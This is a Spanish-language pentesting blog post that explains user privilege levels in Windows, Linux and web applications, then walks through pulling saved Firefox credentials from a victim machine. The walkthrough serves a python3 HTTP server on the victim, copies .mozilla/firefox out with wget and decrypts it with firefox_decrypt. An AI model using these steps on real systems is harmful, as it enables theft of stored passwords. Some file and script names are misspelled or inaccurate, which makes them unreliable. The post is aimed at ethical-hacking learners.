---
layout: single
title: Escalada de privilegios.
excerpt: "Son técnicas para acceder a la información o privilegios que tiene un usuario dentro de un sistema"
date: 2022-11-30
classes: wide
header:
  teaser: /assets/images/pe1.jpeg
  teaser_home_page: true
categories:
- Pentesting
- Ethical Hacking 
tags:
- Privilegios
- Windows
- Linux
---

## Usuarios en Windows.<br>
- Invitado (Guest): Puede usar el equipo pero no modificar nada dentro de el.<br>
- Standard: Usuario con capacidad de modificar algunas configuraciones del sistema siempre y cuando solo afecten al mismo usario.<br>
- Administrator: Usuario con capacidad de modificar el sistema, desactivar el antivirus, instalar herramientas de forma global o acceder a la información de otros usuarios dentro del mismo sistema.<br>
- NT Authority\System: Usuario del sistema que ejecuta las tareas y servicios del sistema operativo.<br><br>

## Usuarios en Linux.<br>
- Service user: Usuario que ejecuta los servicio del sistema como montar un servicio http para mostrar un sitio web en un servidor. Los privilegios de este usuario se limitan al servicio que esté ejecutando.<br>
- Standard: Usuario normal para usar el sistema.<br>
- Root: Usuario que tiene control total del sistema.<br><br>

## Usuarios en aplicaciones web.<br>
- Administrador.<br>
- Editor.<br>
- Standard.<br>
- Otros.<br><br>

## Técnica de escalada de privilegios horizontal.<br>
Es accesar a la información de otros usuarios pero con los mismos privilegios que tiene el usuario con el cual ganaste acceso al sistema.<br>

## Técnica de escalda de privilegios vertical.<br>
Es acceder a un usuario que tenga mas control dentro del sistema para realizar modificaciones.<br><br>

![](/assets/images/pe.jpeg) 

## ls -la
Con el commando ls -la puedes ver las carpetas ocultas, el propietario y que privilegios tienen asignadas los directorio. Debido a que en firefox se almacenan sesiones se puede llegar a listar las credenciales y obtenerlas en texto claro con una herramienta que permita hacer un decrypt en caso de que este el directorio ./mozilla/firefox.<br>
Ingresas al directorio .mozilla/firefox y ve si estan los archivos key.db y login.json dentro de cualquier archivo pero con estansión .default.<br>
Haz un cat a login.json y si está el archivo user.encryp y password.encryp significa que hay una sesión activa y puedes llegar a computar las credenciales.<br>
Clona la siguiente herramienta que te permitirá ver las credenciales.<br>
git clone https://github.com/unode/firefox_decrypt <br>
```
ls -la -> ./mozilla/firefox
cd ./mozilla/firefox
ls -> key.db	login.json
cat login.json -> user.encryp	password.encryp
git clone https://github.com/unode/firefox_decrypt
```

Desde la maquina víctima ver si tiene instalado python3 para poder compartirte un servicio http por el puerto 8000 para que no te pida credenciales al momento de compartirlo.<br>
Copia de forma recursiva todos los recursos que haya dentro del directorio ./mozilla/firefox a tu maquina con wget.<br>
```
which python3 -> /usr/bin/pyhton3
python3 -m http.server 8000
wget -r <ip-address>:8000
```
Correr el script en python e indicale la ruta de donde hará el decryp.
```
python3 firefox_decryp.py /ejemplo/directorio/copiado
```

